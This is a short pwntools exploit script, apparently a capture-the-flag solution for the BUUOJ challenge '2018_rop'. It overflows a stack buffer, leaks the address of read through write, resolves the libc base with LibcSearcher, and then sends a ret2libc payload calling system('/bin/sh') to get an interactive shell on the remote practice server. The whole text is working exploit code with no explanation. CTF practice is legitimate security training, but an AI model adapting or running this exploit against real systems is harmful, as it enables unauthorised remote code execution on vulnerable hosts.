from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='DEBUG')
#io = process("./2018_rop")
io = remote('node3.buuoj.cn',26602)
elf = ELF('./2018_rop')
write_plt = elf.plt['write']
read_got = elf.got['read']
main = 0x80484C6
payload = 'a'*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(read_got)+p32(4)
io.sendline(payload)
read_add = u32(io.recv())
libc = LibcSearcher('read',read_add)
base = read_add - libc.dump('read')
sys_add = base+libc.dump('system')
bin_sh = base +libc.dump('str_bin_sh')
payload ='a'*(0x88+4) + p32(sys_add)+p32(0xdeadbeef)+p32(bin_sh)
io.sendline(payload)
io.interactive()